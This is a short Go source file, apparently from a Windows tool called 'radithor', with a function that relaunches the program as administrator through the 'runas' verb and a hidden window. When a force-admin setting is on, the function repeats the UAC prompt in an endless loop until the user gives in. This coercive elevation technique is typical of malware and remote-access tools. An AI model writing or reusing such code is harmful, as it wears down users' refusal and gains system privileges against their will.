package funcs

import (
	"os"
	"radithor/core"
	"radithor/store"

	"shared/config"

	"golang.org/x/sys/windows"
)

func ElevateWithConfig() {
	verb := windows.StringToUTF16Ptr("runas")
	file := windows.StringToUTF16Ptr(store.ExecPath)
	dir := windows.StringToUTF16Ptr(store.ExecDir)

	if config.GetConfigAny[bool](store.FORCE_ADMIN) {
		for {
			err := windows.ShellExecute(0, verb, file, nil, dir, windows.SW_HIDE)
			if err != nil {
				continue
			}

			core.LogInfo("[ElevateWithConfig] user accepted, relaunching...")
			os.Exit(0)
		}
	}

	if config.GetConfigAny[bool](store.PROMPT_ADMIN) {
		err := windows.ShellExecute(0, verb, file, nil, dir, windows.SW_HIDE)
		if err != nil && !config.GetConfigAny[bool](store.CONTINUE_WITHOUT_ADMIN) {
			core.LogError("[ElevateWithConfig] user declined, cant continue without")
			os.Exit(0)
		}

		core.LogInfo("[ElevateWithConfig] user accepted or continuing without")
	}
}
